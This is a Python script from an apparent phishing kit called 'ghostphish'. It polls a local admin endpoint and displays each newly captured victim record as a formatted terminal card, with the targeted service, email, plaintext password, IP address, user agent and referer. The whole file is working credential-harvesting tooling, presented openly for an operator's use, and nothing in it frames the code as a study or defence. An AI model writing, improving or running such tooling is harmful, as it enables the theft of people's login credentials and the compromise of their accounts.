#!/usr/bin/env python3
"""
ghostphish — live capture watcher
Polls /admin/captures every 2s and renders new entries in a boxed card.
Developed by Yaman.RedTeam
"""
import sys
import time
import json
import urllib.request

URL = "http://localhost:8000/admin/captures"
WIDTH = 68

# ANSI 256-color palette
R = "\033[38;5;196m"
RD = "\033[38;5;124m"
G = "\033[38;5;46m"
Y = "\033[38;5;220m"
C = "\033[38;5;51m"
W = "\033[38;5;255m"
GY = "\033[38;5;244m"
D = "\033[2m"
BLD = "\033[1m"
N = "\033[0m"


def truncate(text: str, max_len: int) -> str:
    if len(text) <= max_len:
        return text
    return text[: max_len - 1] + "…"


def render_capture(c: dict) -> None:
    """Print a boxed card for one capture."""
    ts = c["timestamp"][11:19]
    date = c["timestamp"][:10]
    cid = c["id"]
    svc = c["service"]
    email = truncate(c["email"], 46)
    pw = truncate(c["password"], 46)
    ip = c["ip_address"]
    ua = truncate(c.get("user_agent") or "-", 46)
    referer = truncate(c.get("referer") or "-", 46)

    # Top border with capture ID + timestamp
    header = f"CAPTURE #{cid}  ·  {date} {ts}"
    header_padded = f" {header} "
    border_len = WIDTH - len(header_padded) - 4
    print(
        f"\n  {R}┌─{N}{R}{BLD}{header_padded}{N}"
        f"{R}{'─' * border_len}┐{N}"
    )
    print(f"  {R}│{N}" + " " * (WIDTH - 2) + f"{R}│{N}")

    # Rows
    for label, value, val_color in [
        ("service",  svc,     C),
        ("email",    email,   Y),
        ("password", pw,      G),
        ("ip",       ip,      W),
        ("user-agent", ua,    GY),
        ("referer",  referer, GY),
    ]:
        line = f"    {GY}{label:<11}{N} {val_color}{value}{N}"
        # Compute visible length (strip ANSI)
        visible = f"    {label:<11} {value}"
        pad = WIDTH - 2 - len(visible)
        print(f"  {R}│{N}{line}{' ' * max(0, pad)}{R}│{N}")

    print(f"  {R}│{N}" + " " * (WIDTH - 2) + f"{R}│{N}")
    print(f"  {R}└{'─' * (WIDTH - 2)}┘{N}", flush=True)


def main() -> int:
    seen = set()
    first_tick = True

    print(f"  {D}watching /admin/captures every 2s...{N}\n", flush=True)

    try:
        while True:
            try:
                with urllib.request.urlopen(URL, timeout=3) as resp:
                    data = json.loads(resp.read())
            except Exception as e:
                print(f"  {R}[!] fetch error: {e}{N}", flush=True)
                time.sleep(3)
                continue

            captures = data.get("captures", [])
            for c in reversed(captures):
                cid = c["id"]
                if cid in seen:
                    continue
                seen.add(cid)
                if first_tick:
                    continue  # don't spam old rows on startup
                render_capture(c)
            first_tick = False
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n  {D}stopped watching · container still running.{N}\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
